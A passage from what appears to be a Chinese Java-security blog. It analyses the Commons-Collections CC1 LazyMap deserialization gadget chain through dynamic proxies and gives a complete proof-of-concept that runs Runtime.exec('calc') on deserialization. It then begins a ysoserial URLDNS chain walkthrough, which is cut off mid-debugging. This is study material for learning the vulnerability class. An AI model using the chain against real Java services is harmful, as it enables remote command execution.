id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>接下来是LazyMap链，CC1的另一条链，也是ysoserial中利用CC1的链。在分析<code>InvokerTransformer</code>类时说到该类为最终的执行类，找到调用<code>InvokerTransformer.transform(Object)</code>方法的类，其中有上文分析的TransformedMap类，还有个就是LazyMap类</p><p><img src="/posts/dd664be3/cc1-36.png" title="调用transform方法的类"></p><p>该类通过构造方法传入对象并赋值给<code>factory</code></p><p><img src="/posts/dd664be3/cc1-38.png" title="构造方法"></p><p>调用了<code>transform()</code>方法的<code>get</code>方法</p><p><img src="/posts/dd664be3/cc1-37.png" title="get方法"></p><p><code>get</code>方法中会判断参数<code>key</code>是否为<code>HashMap</code>中<code>Map</code>的内容，如果不是<code>Map</code>中的内容，就创建一个<code>value</code>作为<code>key</code>的值放入<code>Map</code>中，给value赋值时调用了<code>transform()</code>方法。<br>该<code>get()</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用，通过构造方法传入<code>LazyMap</code>对象然后在<code>invoke</code>方法中调用到<code>LazyMap.get()</code>方法</p><p><img src="/posts/dd664be3/cc1-39.png" title="invoke方法"></p><p>invoke方法的调用并不在该类重写的<code>readObject</code>方法中，因此入口点就有点变化，<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>动态类，这里调用<code>invoke</code>方法就涉及到<strong>动态代理</strong></p><p><img src="/posts/dd664be3/cc1-40.png" title="InvocationHandler"></p><p>动态代理<code>InvocationHandler</code>：</p><blockquote><p>每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用</p></blockquote><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[接口类] proxyMap=(接口类)Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span><br></pre></td></tr></table></figure><p>例如使用Map对象进行动态代理：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p>其中涉及到<code>Proxy</code>代理类，并通过<code>newProxyInstance()</code>实现动态代理。<br><code>newProxyInstance</code>类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span>;</span><br></pre></td></tr></table></figure><p>三个参数分别表示:目标对象所属类的加载器、目标对象实现的接口数组、调用接口时触发的对应方法</p><p>实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxydemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">            <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.map=map;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;调用了invoke方法&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;put&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;调用了put方法&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        InvocationHandler in=<span class="keyword">new</span> <span class="title class_">demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        Map map=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,in);</span><br><span class="line">        map.put(<span class="string">&quot;11&quot;</span>,<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;22&quot;</span>,<span class="string">&quot;22&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-41.png" title="InvocationHandler"></p><p>可以看到map对象每执行一次方法，便会调用执行一次invoke方法，invoke方法也可以起拦截器的作用。</p><p>简单了解了动态代理的用法，接下来回到LazyMap类的调用<br><code>LazyMap</code>的<code>get</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用<br>因此入口点就在实现动态类调用到LazyMap的invoke方法。</p><h3 id="完整利用链-1"><a href="#完整利用链-1" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>LazyMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="构造POC-1"><a href="#构造POC-1" class="headerlink" title="构造POC"></a>构造POC</h3><p>POC的前半段依旧采用TransformedMap利用链的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>将传参入口变更至LazyMap类中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map Lmap = LazyMap.decorate(map, transformerChain);</span><br></pre></td></tr></table></figure><p>同<code>TransformedMap</code>利用链一样通过反射调用<code>AnnotationInvocationHandler</code>类，然后调用InvocationHandler代理调用<code>AnnotationInvocationHandler</code>类的构造函数传入参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br></pre></td></tr></table></figure><p>然后创建<code>proxy</code>代理对象，参数分别为<code>Map加载器</code>、<code>Map类数组</code>、<code>InvocationHandler对象invohandler</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br></pre></td></tr></table></figure><p>再通过代理调用代理对象，执行<code>AnnotationInvocationHandler.invoke</code>方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后就是对<code>InvocationHandler</code>对象进行序列化，再反序列化触发漏洞</p><p>得到最终POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化InvocationHandler对象</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        out.writeObject(invohandlerproxy);</span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-42.png" title="执行POC"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>整体来说就是找到能够执行恶意函数的方法，然后一步步查看调用链，最后找到反序列化入口，cc1链看下来就比URL链复杂很多，链路调用步骤多了很多，有些链的类还需要明白怎么实现的，LazyMap加了动态代理然后调用链更绕。<br>分析单从完整利用链来推导相对容易很多，但会错过很多细节以及实现原理，可能会导致当时看完明白了过后过了段时间再回想就没法理清完整的利用链，这次分析的过程花费了不少的时间，中间有很多原理细节琢磨了有点久，只是记了我认为需要细理解的地方，可能还有些小细节没些或者被跳过了没注意，后面再看到的话再补充进来吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a><br>P牛-Java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-URLDNS链学习与分析</title>
      <link href="/posts/643c7e53.html"/>
      <url>/posts/643c7e53.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>延伸java序列化和java反射的内容，针对一些gadget利用链的一些学习，理解一下利用链的分析过程。<br>本文学习URLDNS反序列化链，也是java反序列化利用链里面最简单的一条，也利用java反序列化和反射的相关知识，可把前两篇java基础学习的知识运用在利用链里面，记录下利用链相关知识点。</p><p>本文角度两个方面，一是从ysoserial工具利用URLDNS角度分析学习，另一个角度是从URLDNS利用链分析学习。</p><h1 id="0x01、URLDNS链简述"><a href="#0x01、URLDNS链简述" class="headerlink" title="0x01、URLDNS链简述"></a>0x01、URLDNS链简述</h1><p>URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果<font color="red">不是命令执⾏</font>，⽽是<font color="red">⼀次DNS请求</font>。</p><p>URLDNS通常用于快速监测是否存在反序列化漏洞，尤其对<strong>无回显的漏洞检测</strong>，原因：</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>也就是说URLDN可直接调用java内置库即可进行操作，无需依赖其他第三方组件，同时不限制jdk版本不通带来的语言代码差异。</p><p>URLDNS链主要问题产生于HashMap,<font color="red">HashMap重写了readObject()反序列化方法，并且参数可控导致序列化漏洞</font>。</p><blockquote><p>HashMap简单介绍:<br>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><h1 id="0x02、yso-URLDNS利用链分析"><a href="#0x02、yso-URLDNS利用链分析" class="headerlink" title="0x02、yso-URLDNS利用链分析"></a>0x02、yso-URLDNS利用链分析</h1><h2 id="ysoserial环境准备"><a href="#ysoserial环境准备" class="headerlink" title="ysoserial环境准备"></a>ysoserial环境准备</h2><p>运行环境：idea<br>java环境: jdk8<br>漏洞环境：ysoserial(<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>)</p><p>idea相关配置:<br>下载ysoserial漏洞环境后在idea打开项目，idea会自动同步pom.xml中的依赖，注意的点是，需要更改文件-项目结构-项目设置-项目中的sdk版本和sdk默认值，如下图即可，不然在编译上可能会报错。随后构建项目即可。</p><p><img src="/posts/643c7e53/url-1.png" title="项目结构"><br><img src="/posts/643c7e53/url-2.png" title="java环境"></p><p>通过pol.xml知道主程序位置</p><p><img src="/posts/643c7e53/url-4.png" title="主程序"></p><p>在运行或者debug调试GeneratePayload.java文件，出现下面红色提示表示运行正常，项目部署成功，便可进行urldns链测试。</p><p><img src="/posts/643c7e53/url-3.png" title="运行部署"></p><p>运行-编辑配置里输入测试参数</p><p><img src="/posts/643c7e53/url-7.png" title="运行部署"></p><p>相当于使用主程序直接执行命令</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><h2 id="yso-URLDNS链分析"><a href="#yso-URLDNS链分析" class="headerlink" title="yso-URLDNS链分析"></a>yso-URLDNS链分析</h2><p>yso生成URLDNS利用的序列化数据，主要为<code>URLDNS</code>、<code>url</code>两个参数</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><p>在主程序获取参数下断点</p><p><img src="/posts/643c7e53/url-6.png" title="断点"></p><p>进行debug调试，参数<code>args[0]</code>即URLDNS传递给<code>payloadType</code>变量，参数<code>args[1]</code>即url传递给<code>command</code>变量</p><p><img src="/posts/643c7e53/url-8.png" title="断点"></p><p>获取Class类对象，类为<code>GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className</code>对应得就是<code>ysoserial.payloads.URLDNS</code>类</p><p><img src="/posts/643c7e53/url-10.png" title="获取类对象"></p><p>对应返回给<code>payloadClass</code>对象</p><p><img src="/posts/643c7e53/url-11.png" title="获取类对象"></p><p>接下来对<code>Class对象</code>进行实例化</p><p><img src="/posts/643c7e53/url-12.png" title="实例化"></p><p>跟进<code>getObject()</code>方法，传递command参数也就是传入的url参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">               <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">               <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">               <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">               <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">               <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">               ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/643c7e53/url-13.png" title="getObject方法"></p><p>getObject方法中建立了<code>URLStreamHandler</code>流对象和<code>HashMap</code>对象,其中handler对象为<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code><br><code>URLStreamHandler handler = new SilentURLStreamHandler();</code><br>这次调用的子类<code>SilentURLStreamHandler</code>方法，去规避生成序列化的过程中触发dns，因为调用子类在获取<code>getHostAddress</code>方法时返回<code>Null</code>,并不执行父类<code>URLStreamHandler</code>中的<code>getHostAddress()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生成<code>URL对象</code>，并将<code>url参数</code>和<code>URLStreamHandler</code>传入<code>URL对象</code>中</p><p><img src="/posts/643c7e53/url-14.png" title="建立对象"></p><p>随后执行<code>HashMap</code>的<code>put()</code>方法,将<code>URL对象</code>作为<code>HashMap值</code>，将<code>url参数值</code>作为<code>key的值</code>存储在<code>HashMap</code>中<br><code>ht.put(u, url);</code><br>再通过反射机制将<code>URL对象</code>的<code>hashCode值</code>设置为-1<br><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code></p><p><img src="/posts/643c7e53/url-15.png" title="调用反射机制"></p><p>最后返回HashMap对象ht</p><p><img src="/posts/643c7e53/url-16.png" title="返回HashMap对象"></p><p>在获取HashMap对象后对其进行序列化操作，这边没有设置out定向输出的文件，out就没对应数值,对应命令行最后加<code> &gt; serialize.ser</code>。</p><p><img src="/posts/643c7e53/url-17.png" title="序列化操作"></p><p>由于<code>HashMap</code>对序列化<code>writeObject()</code>也进行了重写，所以会调用<code>HashMap</code>的序列化方法进行序列化操作，正常的序列化操作。</p><p><img src="/posts/643c7e53/url-18.png" title="序列化操作"></p><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>进行序列化写入</p><p><img src="/posts/643c7e53/url-19.png" title="序列化操作"></p><p>到此ysoserial工具的URLDNS利用链就执行完成，输出payload序列化的数据。</p><p><img src="/posts/643c7e53/url-20.png" title="生成序列化文件"></p><h2 id="yso-URLDNS链反序列化"><a href="#yso-URLDNS链反序列化" class="headerlink" title="yso-URLDNS链反序列化"></a>yso-URLDNS链反序列化</h2><p>通过对输出的序列化数据，进行反序列化，触发漏洞。</p><p><img src="/posts/643c7e53/url-21.png" title="反序列化触发漏洞"><br><img src="/posts/643c7e53/url-22.png" title="DNSLOG接受到数据"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream obj=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\OKAY\\Desktop\\java-web\\ysoserial\\payload.ser&quot;</span>));</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03、URLDNS链反序列化分析"><a href="#0x03、URLDNS链反序列化分析" class="headerlink" title="0x03、URLDNS链反序列化分析"></a>0x03、URLDNS链反序列化分析</h1><h2 id="正常反序列化readObject阶段"><a href="#正常反序列化readObject阶段" class="headerlink" title="正常反序列化readObject阶段"></a>正常反序列化readObject阶段</h2><p>这里就跟着payload的反序列化进行分析下去吧，（当然也可以直接在HashMap重写的readObject方法进行下断点，可以直接分析反序列化触发的漏洞），这里从头来可以理解一下运行流程，但前些正常的反序列化过程比较长有些就略过了，记录下关键的步入点吧。<br>反序列化处下断点，debug运行</p><p><img src="/posts/643c7e53/url-30.png" title="下断点"></p><p>运行后，需要强行步入（Alt+Shift+F7）readObject方法，注：步入会直接跳过<br>进入后，还需要再次强行步入进入readObject方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject方法"></p><p>进入后，前面都是正常的一些判断，步过直到调用<code>readObject0()</code>方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject0方法"><br><img src="/posts/643c7e53/url-32.png" title="readObject0方法"></p><p>进入readObject0()方法，然后又是一系列的正常操作和判断，再关注到TC的判断如下图，由于TC为Obeject对象，并非String类对象，所以判断为false，进入调用readOrdinaryObject方法（读取二进制数据）</p><p><img src="/posts/643c7e53/url-33.png" title="readObject0方法"></p><p>进入readOrdinaryObject方法，这里读取序列化数据，并将序列化数据赋值给对象</p><p><img src="/posts/643c7e53/url-34.png" title="readOrdinaryObject方法"></p><p>后面将对象进行实例化并进行一些判断操作，一直到进入<code>readSerialData</code>方法</p><p><img src="/posts/643c7e53/url-35.png" title="readOrdinaryObject方法"><br><img src="/posts/643c7e53/url-36.png" title="readSerialData方法"></p><p><code>readSerialData</code>方法对序列化数据进行读取，一直到调用<code>invokeReadObject</code>方法</p><p><img src="/posts/643c7e53/url-38.png" title="invokeReadObject方法"></p><p>通过反射invoke去判断对象是否有重写readObject方法</p><p><img src="/posts/643c7e53/url-39.png" title="invokeReadObject方法"><br><img src="/posts/643c7e53/url-40.png" title="invokeReadObject方法"></p><p>返回<code>ma.invoke</code>，跟进查看<code>ma.invoke</code></p><p><img src="/posts/643c7e53/url-41.png" title="invokeReadObject方法"></p><p>返回<code>delegate.invoke</code>,跟进<code>delegate.invoke</code>方法</p><p><img src="/posts/643c7e53/url-42.png" title="invokeReadObject方法"></p><p>获得返回<code>HashMap</code>重写的<code>readObject</code>方法</p><p><img src="/posts/643c7e53/url-43.png" title="invokeReadObject方法"></p><p>跟进返回的<code>invoke0</code>,便进入调用的<code>HashMap</code>重写的<code>readObject</code>方法<br>到这里，进入<code>HashMap</code>重写的<code>readObject()</code>方法</p><p><img src="/posts/643c7e53/url-23.png" title="重写的readObject()方法"></p><h2 id="HashMap反序列化readObject阶段"><a href="#HashMap反序列化readObject阶段" class="headerlink" title="HashMap反序列化readObject阶段"></a>HashMap反序列化readObject阶段</h2><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>的值，并反序列化读取还原<code>key</code>和<code>value</code>的值，随后进行<code>hash()</code>运算保证唯一</p><p><img src="/posts/643c7e53/url-24.png" title="获取key和value值"></p><p>跟进<code>hash()</code>,hash方法判断key是否为空，不为空就调用<code>URL</code>类中的<code>hashcode()</code>方法，key值为url如下图标识所示</p><p><img src="/posts/643c7e53/url-25.png" title="hash()方法"></p><p>跟进当前<code>hashcode()</code>方法，会首先判断hashcode是否为-1,为-1则进入<code>URLStreamHandler流对象的hashcode()</code>方法</p><p><img src="/posts/643c7e53/url-26.png" 